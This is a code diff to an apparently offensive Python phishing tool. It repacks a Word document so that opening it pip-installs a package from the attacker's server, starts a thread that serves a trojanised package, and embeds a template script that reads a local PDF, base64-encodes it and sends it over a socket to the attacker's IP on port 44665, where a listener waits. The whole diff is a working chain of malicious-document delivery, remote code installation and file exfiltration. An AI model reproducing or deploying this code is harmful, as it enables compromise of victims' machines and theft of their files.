@@ -5,6 +5,22 @@ import repack_word_doc
 import phish
 import base64
 
+import trojanpkgweb
+import threading
+
+SCRIPT_TEMPLATE = """
+import base64
+import socket
+with open("C:/GreatBookPage7.pdf", "rb") as f:
+    document = f.read()
+encoded = base64.encodestring(document)
+
+s=socket.socket()
+s.connect(('{}',44665))
+s.send(encoded)
+s.close()
+"""
+
 def full_phish(cmd):
     port = 44440
     my_ip = listener.get_external_ip()
@@ -18,8 +34,14 @@ def full_phish(cmd):
     print(contents.decode())
 
     print("Baseline worked.. running real command..")
-    repack_word_doc.repack(command="C:/Progra~1/Python36/python.exe -m pip install https://www.bouncybouncy.net/ud.tar.gz")
+    url = "http://{}:8080/foo-1.0.tar.gz"
+    repack_word_doc.repack(command="C:/Progra~1/Python36/python.exe -m pip install {}".format(url))
     phish.phish()
+
+    full_script = SCRIPT_TEMPLATE.format(my_ip)
+
+    web_thread = threading.Thread(target=trojanpkgweb.run_trojan_server, args=[full_script])
+    web_thread.start()
 
     print("Using", my_ip, "as external IP")
     contents = listener.listen_once(44665)
